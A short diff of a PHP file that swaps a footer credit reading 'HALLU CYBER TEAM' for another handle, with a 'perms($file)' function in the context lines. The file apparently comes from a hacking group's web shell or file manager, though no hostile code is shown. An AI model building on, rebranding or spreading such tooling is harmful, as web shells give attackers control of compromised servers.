@@ -228,7 +228,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br/>HALLU CYBER TEAM</center>
+echo '<center><br/>AhmadMaZulPahwan7</center>
 </body>
 </html>';
 function perms($file){
